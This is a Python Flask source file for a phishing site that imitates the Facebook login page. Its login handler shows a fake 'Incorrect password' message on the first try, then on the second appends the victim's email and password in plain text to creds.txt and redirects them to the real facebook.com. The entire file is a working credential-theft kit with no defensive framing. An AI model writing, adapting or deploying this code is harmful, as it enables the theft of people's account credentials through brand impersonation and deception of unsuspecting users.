from flask import Flask, render_template_string, request, redirect, session

app = Flask(__name__)
app.secret_key = 'chave-muito-secreta'

html_code = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Log in to Facebook</title>
  <style>
    * {
      padding: 0px;
      margin: 0;
      box-sizing: border-box;
      font-family: Helvetica, Arial, sans-serif;
    }
    body {
      background-color: #f0f2f5;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .wrapper {
      display: flex;
      max-width: 90px;
      width: 50%;
      padding: 200px;
      justify-content: space-between;
      align-items: center;
    }
    .logo-section {
      flex: 10;
      padding-right: 320px;
      transform: translateY(-200%);
    }
    .logo {
      color: #1877f2;
      font-size: 0rem;
      font-weight: bold;
      line-height: ;
      margin-bottom: 0px;
    }
    .login-form {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 4px 2px 4px rgba(1, 0, 0, 0.1), 2px 8px 16px rgba(0, 0, 0, 0.1);
      padding: 30px;
      width: 330px;
      flex-shrink: 0;
    }
    .login-form input {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 12px;
      border: 1px solid #dddfe2;
      border-radius: 10px;
      font-size: 15px;
    }
    .login-btn {
      background-color: #1877f2;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 20px;
      font-weight: bold;
      line-height: 48px;
      padding: 0 16px;
      width: 100%;
      margin-bottom: 16px;
      cursor: pointer;
    }
    .login-btn:hover {
      background-color: #166fe5;
    }
    .forgot-password {
      color: #1877f2;
      display: block;
      font-size: 14px;
      text-align: center;
      text-decoration: none;
      margin-bottom: 20px;
    }
    .divider {
      border-bottom: 2px solid #dadde1;
      margin: 15px 15px;
    }
    .create-account {
      background-color: #42b72a;
      border: none;
      border-radius: 10px;
      color: #fff;
      cursor: pointer;
      font-size: 17px;
      font-weight: bold;
      line-height: 48px;
      padding: 0 16px;
      margin: 0 auto;
      display: block;
    }
    .create-account:hover {
      background-color: #36a420;
    }
    @media (max-width: 900px) {
      body {
        overflow: auto;
      }
      .wrapper {
        display: flex;
        width: 90%;
        max-width: 900px;
        padding: 40px;
        justify-content: center;
        align-items: center;
      }
      .logo-section {
        padding-right: 0;
        margin-bottom: 10px;
        transform: none;
      }
      .logo {
        font-size: 3rem;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="logo-section">
      <h1 class="logo">facebook</h1>
    </div>
    <div class="login-form">
      <form action="/login" method="POST">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="divider"></div>
        <button type="button" class="create-account">Create New Account</button>
      </form>
      {% if error %}
      <p style="color:red; text-align:center; margin-top: 10px;">Incorrect password. Please try again.</p>
      {% endif %}
    </div>
  </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_code, error=False)

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['pass']

    if 'attempts' not in session:
        session['attempts'] = 1
        return render_template_string(html_code, error=True)
    else:
        session.pop('attempts', None)
        with open('creds.txt', 'a') as f:
            f.write(f"{email} | {password}\n")
        return redirect("https://facebook.com")

if __name__ == '__main__':
    app.run(debug=True)
